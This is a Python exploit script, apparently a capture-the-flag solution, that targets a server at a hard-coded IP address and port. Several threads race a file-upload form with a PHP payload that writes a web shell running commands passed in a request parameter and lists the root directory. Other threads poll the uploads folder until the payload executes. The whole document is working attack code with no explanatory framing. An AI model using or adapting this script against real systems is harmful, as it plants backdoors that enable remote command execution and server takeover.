import requests
from threading import Thread

base_url = "http://47.243.63.167:13404"

def brute():
    x = 1
    while True:
        r = requests.get(f"{base_url}/uploads/cape.php")
        isi = r.text

        if "root" in isi:
            print(isi)
            break
        elif r.status_code != 404:
            print(isi)
        else:
            print(f'[{str(x)}] attempt -> {str(r.status_code)}')

        x += 1

def upload():
    while True:
        requests.post(f"{base_url}/",files={"myfile": ("cape.php", b'<?= $file="capelah.php"; $content = \'<?= passthru(\$_REQUEST["elah"]); ?>\';file_put_contents(\$file,\$content); var_dump(glob("/*"))?>')})

Thread(target=brute).start()
Thread(target=brute).start()
Thread(target=brute).start()
Thread(target=upload).start()
Thread(target=upload).start()
Thread(target=upload).start()
Thread(target=upload).start()
Thread(target=upload).start()